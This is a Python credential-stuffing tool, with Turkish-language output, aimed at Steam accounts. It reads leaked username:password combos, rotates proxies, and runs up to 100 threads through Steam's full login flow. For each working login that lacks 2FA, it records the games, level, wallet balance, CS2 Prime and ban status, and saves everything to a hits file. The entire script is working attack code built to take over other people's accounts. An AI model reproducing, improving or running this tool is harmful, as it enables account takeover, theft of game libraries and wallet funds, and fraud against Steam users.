import os, sys, re, json, time, random, base64, uuid, threading, queue, binascii
from datetime import datetime
from collections import Counter, deque
from typing import Optional, Dict, Any, Tuple, List
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
C = '\033[96m'
W = '\033[0m'
B = '\033[94m'
BOLD = '\033[1m'

TIMEOUT = 5
MAX_WORKERS = 100

HITS_DIR = "hits"
os.makedirs(HITS_DIR, exist_ok=True)
HITS_FILE = os.path.join(HITS_DIR, "steam_hits.txt")
GAMES_FILE = os.path.join(HITS_DIR, "GamesCaptured.txt")

class Stats:
    def __init__(self):
        self.lock = threading.Lock()
        self.checked = 0
        self.hits = 0
        self.bad = 0
        self.twfa = 0
        self.errors = 0
        self.total = 0

    def inc(self, key):
        with self.lock:
            setattr(self, key, getattr(self, key) + 1)

stats = Stats()

history = deque(maxlen=10)

COUNTRY_MAP = {
    "TR": "Türkiye", "KZ": "Kazakistan", "UA": "Ukrayna", "RU": "Rusya",
    "US": "Amerika Birleşik Devletleri", "GB": "İngiltere", "DE": "Almanya",
    "FR": "Fransa", "AR": "Arjantin", "BR": "Brezilya", "IN": "Hindistan",
    "CN": "Çin", "JP": "Japonya", "KR": "Güney Kore", "PL": "Polonya",
    "ES": "İspanya", "IT": "İtalya", "CA": "Kanada", "AU": "Avustralya",
    "NL": "Hollanda", "SE": "İsveç", "NO": "Norveç", "DK": "Danimarka",
    "FI": "Finlandiya", "MX": "Meksika", "ZA": "Güney Afrika", "ID": "Endonezya",
    "MY": "Malezya", "PH": "Filipinler", "SG": "Singapur", "TH": "Tayland",
    "VN": "Vietnam", "TW": "Tayvan", "AE": "Birleşik Arap Emirlikleri",
    "SA": "Suudi Arabistan", "EG": "Mısır", "GR": "Yunanistan", "PT": "Portekiz",
    "CZ": "Çekya", "HU": "Macaristan", "RO": "Romanya", "BG": "Bulgaristan",
    "RS": "Sırbistan", "HR": "Hırvatistan", "BA": "Bosna-Hersek", "SK": "Slovakya",
    "BY": "Belarus", "GE": "Gürcistan", "AZ": "Azerbaycan", "UZ": "Özbekistan",
    "TM": "Türkmenistan", "KG": "Kırgızistan", "TJ": "Tacikistan", "MD": "Moldova",
    "CH": "İsviçre", "AT": "Avusturya", "BE": "Belçika", "IE": "İrlanda",
    "NZ": "Yeni Zelanda", "CL": "Şili", "CO": "Kolombiya", "PE": "Peru",
    "VE": "Venezuela", "EU": "Avrupa Birliği"
}

def save(file, line):
    with open(file, "a", encoding="utf-8") as f:
        f.write(line + "\n")

def format_proxy(proxy_str: str) -> Optional[str]:
    proxy_str = proxy_str.strip()
    if not proxy_str:
        return None
    if "://" in proxy_str:
        return proxy_str
    parts = proxy_str.split(":")
    if len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    elif len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return f"http://{proxy_str}"

def pkcs_encrypt(password: str, modulus_hex: str, exponent_hex: str = "010001") -> Optional[str]:
    try:
        n = int(modulus_hex, 16)
        e = int(exponent_hex, 16)
        k = (n.bit_length() + 7) // 8
        d = password.encode("utf-8")
        if len(d) > k - 11:
            return None
        pl = k - len(d) - 3
        ps = b""
        while len(ps) < pl:
            nd = pl - len(ps)
            rnd = os.urandom(nd * 2)
            ps += bytes([b for b in rnd if b != 0][:nd])
        eb = b"\x00\x02" + ps + b"\x00" + d
        m = int.from_bytes(eb, "big")
        c = pow(m, e, n)
        cb = c.to_bytes(k, "big")
        return base64.b64encode(cb).decode("utf-8")
    except:
        return None

def check_account_fast(username: str, password: str, proxy_url: Optional[str] = None) -> Tuple[str, Optional[Dict]]:
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    })
    if proxy_url:
        session.proxies = {"http": proxy_url, "https": proxy_url}

    try:
        rsa_res = session.get(f"https://api.steampowered.com/IAuthenticationService/GetPasswordRSAPublicKey/v1/?account_name={username}", timeout=5)
        if rsa_res.status_code != 200:
            return "ERROR", None
        rsa_data = rsa_res.json().get("response", {})
        if not rsa_data.get("publickey_mod"):
            return "ERROR", None
            
        encrypted_pass = pkcs_encrypt(password, rsa_data["publickey_mod"], rsa_data["publickey_exp"])
        if not encrypted_pass:
            return "ERROR", None

        begin_res = session.post("https://api.steampowered.com/IAuthenticationService/BeginAuthSessionViaCredentials/v1/",
                                 data={"account_name": username, "encrypted_password": encrypted_pass,
                                       "encryption_timestamp": rsa_data["timestamp"], "remember_login": "true",
                                       "website_id": "Community", "device_friendly_name": "Chrome Browser"},
                                 timeout=5)
        if begin_res.status_code != 200:
            return "ERROR", None
        begin_data = begin_res.json().get("response", {})
        steamid = begin_data.get("steamid")
        if not steamid:
            return "BAD", None

        confirmations = begin_data.get("allowed_confirmations", [])
        guard_types = [c.get("confirmation_type", 0) for c in confirmations]
        if any(t in (3, 4) for t in guard_types):
            return "2FA", None

        poll_res = session.post("https://api.steampowered.com/IAuthenticationService/PollAuthSessionStatus/v1/",
                                data={"client_id": begin_data["client_id"], "request_id": begin_data["request_id"]},
                                timeout=5)
        if poll_res.status_code != 200:
            return "ERROR", None
        poll_data = poll_res.json().get("response", {})
        access_token = poll_data.get("access_token")
        refresh_token = poll_data.get("refresh_token")
        if not access_token or not refresh_token:
            return "BAD", None

        session.get("https://steamcommunity.com/", timeout=3)
        sessionid = session.cookies.get("sessionid")
        if not sessionid:
            sessionid = binascii.hexlify(os.urandom(12)).decode()
            session.cookies.set("sessionid", sessionid, domain=".steamcommunity.com")

        try:
            fin = session.post("https://login.steampowered.com/jwt/finalizelogin",
                               data={"nonce": refresh_token, "sessionid": sessionid, "redir": "https://steamcommunity.com/login/home/?goto="},
                               timeout=5)
            transfer_info = fin.json().get("transfer_info", [])
        except:
            transfer_info = []
        for t in transfer_info:
            url = t.get("url", "")
            params = t.get("params", {})
            if url:
                try: session.post(url, data=params, timeout=3)
                except: pass

        jwt_cookie = f"{steamid}%7C%7C{access_token}"
        for d in [".steamcommunity.com", ".steampowered.com", "store.steampowered.com"]:
            session.cookies.set("steamLoginSecure", jwt_cookie, domain=d, secure=True)
            session.cookies.set("sessionid", sessionid, domain=d)

        games = []
        try:
            r = session.get("https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/",
                            params={"access_token": access_token, "steamid": steamid,
                                    "include_appinfo": "true", "include_played_free_games": "true", "format": "json"},
                            timeout=4)
            if r.status_code == 200:
                games_data = r.json().get("response", {}).get("games", [])
                games = [{"name": g.get("name", f"AppID:{g.get('appid', 0)}"), "hours": round(g.get("playtime_forever", 0) / 60, 1)} for g in games_data]
        except: pass

        level = "0"
        try:
            r = session.get("https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/",
                            params={"access_token": access_token, "steamid": steamid}, timeout=3)
            if r.status_code == 200:
                lvl = r.json().get("response", {}).get("player_level")
                if lvl is not None: level = str(lvl)
        except: pass

        cs2_prime = "Yok"
        try:
            r = session.get("https://store.steampowered.com/account/licenses/", timeout=3)
            if r.status_code == 200:
                if "prime status upgrade" in r.text.lower() or "seçkin durum yükseltmesi" in r.text.lower():
                    cs2_prime = "VAR"
        except: pass

        balance = "Alınamadı"
        try:
            r = session.get("https://store.steampowered.com/account/", timeout=3)
            if r.status_code == 200 and "/login" not in r.url:
                m = re.search(r'id="header_wallet_balance"[^>]*>\s*([^<]+)', r.text, re.IGNORECASE)
                if m: balance = m.group(1).strip()
        except: pass

        is_banned = False
        vac_status = "YOK"
        banned_games = []
        try:
            r = session.get(f"https://steamcommunity.com/profiles/{steamid}/", timeout=4)
            if r.status_code == 200:
                html = r.text
                if re.search(r'profile_ban|VAC ban on record|game ban on record|yasaklanması kayıtlı', html, re.IGNORECASE):
                    is_banned = True
                    vac_status = "VAR (VAC)"
                    if re.search(r'game ban|oyun yasaklaması', html, re.IGNORECASE):
                        vac_status = "VAR (Game Ban)"
                    
                    ban_match = re.search(r'(\d+)\s*(?:VAC ban\(s\) on record|game ban\(s\) on record)', html, re.IGNORECASE)
                    if ban_match:
                        banned_games.append(f"{ban_match.group(1)} adet oyun")
        except: pass

        rust = "Yok"
        rust_banned = False
        for game in games:
            if "Rust" in game.get("name", ""):
                rust = "VAR"
                if is_banned:
                    try:
                        r = session.get("https://help.steampowered.com/tr/wizard/VacBans", timeout=3)
                        if r.status_code == 200 and "Rust" in r.text:
                            rust_banned = True
                    except: pass
                break

        rust_status = rust
        if rust == "VAR" and is_banned:
            rust_status = "VAR (BANLI)" if rust_banned else "VAR (BAN VAR)"
        
        cs2_prime_status = cs2_prime
        if cs2_prime == "VAR" and is_banned:
            cs2_banned = False
            for game in games:
                if "Counter-Strike" in game.get("name", ""):
                    try:
                        r = session.get("https://help.steampowered.com/tr/wizard/VacBans", timeout=3)
                        if r.status_code == 200 and ("Counter-Strike" in r.text or "CS2" in r.text):
                            cs2_banned = True
                    except: pass
                    break
            cs2_prime_status = "VAR (BANLI)" if cs2_banned else "VAR (BAN VAR)"

        game_names = [g.get("name", "") for g in games]
        game_list = ", ".join(game_names[:20]) if game_names else "Oyun yok"

        info = {
            "username": username,
            "password": password,
            "steamid": steamid,
            "level": level,
            "balance": balance,
            "cs2_prime": cs2_prime_status,
            "rust": rust_status,
            "game_list": game_list,
            "game_count": len(games),
            "is_banned": is_banned,
            "vac": vac_status,
            "banned_games": banned_games,
            "games": games[:10],
        }
        return "HIT", info
    except Exception as e:
        return "ERROR", None

def save_games_captured(info: Dict[str, Any]):
    lines = []
    lines.append(f"{info['username']}:{info['password']}")
    lines.append(f"Rust: {info['rust']}")
    lines.append(f"CS2 Prime: {info['cs2_prime']}")
    lines.append(f"Oyunlar: {info['game_list']}")
    
    if info['is_banned']:
        lines.append(f"Ban Durumu: VAR ({info['vac']})")
        if info['banned_games']:
            lines.append(f"Banlı Oyunlar: {', '.join(info['banned_games'])}")
    else:
        lines.append("Ban Durumu: YOK")
    
    lines.append("-" * 58)
    
    with open(GAMES_FILE, "a", encoding="utf-8") as f:
        f.write("\n".join(lines) + "\n")

def process_result(username, password, status, info):
    if status == "HIT":
        save(HITS_FILE, f"{username}:{password} | Oyun:{info['game_count']} | Level:{info['level']} | Prime:{info['cs2_prime']}")
        save_games_captured(info)
        stats.inc("hits")
        with stats.lock:
            history.append((f"{username}:{password}", f"Oyun:{info['game_count']} Lv:{info['level']} Prime:{info['cs2_prime']}", G))
    elif status == "2FA":
        stats.inc("twfa")
        with stats.lock:
            history.append((f"{username}:{password}", "2FA", Y))
    elif status == "BAD":
        stats.inc("bad")
        with stats.lock:
            history.append((f"{username}:{password}", "BAD", R))
    else:
        stats.inc("errors")
        with stats.lock:
            history.append((f"{username}:{password}", "ERROR", Y))

def check_worker(combo, proxy):
    if ":" not in combo:
        return None
    u, p = combo.split(":", 1)
    status, info = check_account_fast(u, p, proxy)
    stats.inc("checked")
    process_result(u, p, status, info)
    return status

ASCII_ART = r"""
  /$$$$$$   /$$                                      
 /$$__  $$ | $$                                      
| $$  \__//$$$$$$    /$$$$$$   /$$$$$$  /$$$$$$/$$$$ 
|  $$$$$$|_  $$_/   /$$__  $$ |____  $$| $$_  $$_  $$
 \____  $$ | $$    | $$$$$$$$  /$$$$$$$| $$ \ $$ \ $$
 /$$  \ $$ | $$ /$$| $$_____/ /$$__  $$| $$ | $$ | $$
|  $$$$$$/ |  $$$$/|  $$$$$$$|  $$$$$$$| $$ | $$ | $$
 \______/   \___/   \_______/ \_______/|__/ |__/ |__/
"""

def visible_len(text):
    return len(re.sub(r'\033\[[0-9;]*m', '', text))

def center_text(text, width=None):
    if width is None:
        try:
            width = os.get_terminal_size().columns
        except:
            width = 80
    padding = max(0, (width - visible_len(text)) // 2)
    return ' ' * padding + text

def get_term_width():
    try:
        return os.get_terminal_size().columns
    except:
        return 80

def build_screen():
    width = get_term_width()
    out = []
    
    out.append("")
    out.append("")
    
    for line in ASCII_ART.strip("\n").split("\n"):
        out.append(B + center_text(line, width) + W)

    out.append("")
    
    out.append(center_text(f"{BOLD}{C}Cheatglobal.com{W}", width))
    out.append("")
    
    stat_line = (
        f"{BOLD}{C}Checked:{W} {stats.checked}  "
        f"{BOLD}{G}Hits:{W} {stats.hits}  "
        f"{BOLD}{R}Bad:{W} {stats.bad}  "
        f"{BOLD}{Y}2FA:{W} {stats.twfa}  "
        f"{BOLD}{Y}Err:{W} {stats.errors}  "
        f"{BOLD}{C}Total:{W} {stats.total}"
    )
    out.append(center_text(stat_line, width))
    out.append("")
    out.append("-" * width)
    out.append(center_text(f"{BOLD}Live Statistics{W}", width))
    out.append("-" * width)
    
    hist_list = list(history)
    for key, status, color in hist_list:
        line = f"{key} | {status}"
        out.append(center_text(color + line + W, width))
    for _ in range(10 - len(hist_list)):
        out.append("")
    
    out.append("-" * width)
    out.append(center_text(f"{BOLD}Author: Kelly{W}", width))
    out.append("")
    
    return "\n".join(out)

def draw_screen():
    os.system("cls" if os.name == "nt" else "clear")
    screen = build_screen()
    sys.stdout.write(screen)
    sys.stdout.flush()

def bulk_check():
    if not os.path.exists("combo.txt"):
        print(f"{R}[!] combo.txt bulunamadı.{W}")
        return
    with open("combo.txt", "r", encoding="utf-8") as f:
        combos = [l.strip() for l in f if ":" in l]
    stats.total = len(combos)
    if stats.total == 0:
        print(f"{R}[!] combo.txt boş veya geçersiz.{W}")
        return

    proxies = []
    if os.path.exists("proxy.txt"):
        with open("proxy.txt", "r", encoding="utf-8") as f:
            proxies = [format_proxy(l) for l in f if l.strip()]
        print(f"[+] {len(proxies)} proxy yüklendi.")
    else:
        print("[!] proxy.txt yok, proxysiz çalışacak.")

    th = input(f"Thread sayısı (varsayılan {MAX_WORKERS}): ").strip()
    threads = int(th) if th.isdigit() else MAX_WORKERS

    print(f"[+] {stats.total} hesap yüklendi. Başlatılıyor...")
    time.sleep(1)

    draw_screen()

    start_time = time.time()

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for combo in combos:
            proxy = random.choice(proxies) if proxies else None
            future = executor.submit(check_worker, combo, proxy)
            futures.append(future)

        completed = 0
        for future in as_completed(futures):
            completed += 1
            with stats.lock:
                draw_screen()

    elapsed = time.time() - start_time
    
    draw_screen()
    print(f"\n{C}" + "═" * 60)
    print(f"   TAMAMLANDI – {elapsed:.1f}s")
    print(f"   Hız: {stats.total / elapsed:.1f} hesap/saniye")
    print(f"   Hit: {stats.hits} | Bad: {stats.bad} | 2FA: {stats.twfa} | Err: {stats.errors}")
    print(f"   Sonuçlar: hits/ klasöründe")
    print("═" * 60 + f"{W}")

def main():
    if not os.path.exists("combo.txt"):
        print(f"{R}[!] combo.txt bulunamadı. Lütfen oluşturun.{W}")
        return

    bulk_check()

if __name__ == "__main__":
    main()
